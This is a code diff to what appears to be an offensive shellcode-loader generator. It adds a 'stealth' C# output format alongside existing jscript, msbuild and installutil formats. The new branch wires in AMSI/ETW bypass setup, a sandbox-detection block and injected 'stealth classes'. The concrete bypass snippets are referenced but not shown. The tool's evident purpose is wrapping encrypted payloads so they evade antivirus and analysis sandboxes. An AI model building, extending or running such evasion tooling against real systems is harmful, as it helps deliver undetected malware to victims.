@@ -69,6 +69,7 @@ FORMATS = {
     'js':          ('jscript.js',     'js'),
     'msbuild':     ('msbuild.csproj', 'cs'),
     'installutil': ('installutil.cs', 'cs'),
+    'stealth':     ('cs_stealth.cs',  'cs'),
 }
 
 
@@ -91,13 +92,21 @@ def render(fmt, encrypted, meta_chain, amsi=False, etw=False, sandbox=False, pay
 
     # build decryption chain for this language
     etw_block = ''
+    stealth_classes = ''
     if lang == 'cs':
         decrypt_block = snippets.build_chain_cs(meta_chain)
         sc_bytes = fmt_cs(encrypted)
-        amsi_block = snippets.get_amsi_cs(amsi)
-        amsi_imports = snippets.get_amsi_imports_cs(amsi or etw)
-        sandbox_block = snippets.get_sandbox_cs(sandbox)
-        etw_block = snippets.get_etw_cs(etw)
+        
+        if fmt == 'stealth':
+            amsi_block = '            _mfs.SetupBypass();' if (amsi or etw) else ''
+            amsi_imports = '' # handled by stealth classes
+            sandbox_block = snippets.get_sandbox_2026(sandbox)
+            stealth_classes = snippets.get_stealth_cs()
+        else:
+            amsi_block = snippets.get_amsi_cs(amsi)
+            amsi_imports = snippets.get_amsi_imports_cs(amsi or etw)
+            sandbox_block = snippets.get_sandbox_cs(sandbox)
+            etw_block = snippets.get_etw_cs(etw)
     elif lang == 'vba':
         decrypt_block = snippets.build_chain_vba(meta_chain)
         sc_bytes = fmt_vba(encrypted)
@@ -144,6 +153,7 @@ def render(fmt, encrypted, meta_chain, amsi=False, etw=False, sandbox=False, pay
         'amsi_imports': amsi_imports,
         'sandbox_block': sandbox_block,
         'etw_block': etw_block,
+        'stealth_classes': stealth_classes,
         'crypto_using': crypto_using,
         'msbuild_crypto_using': msbuild_crypto,
         'vba_amsi_declares': vba_amsi_declares,
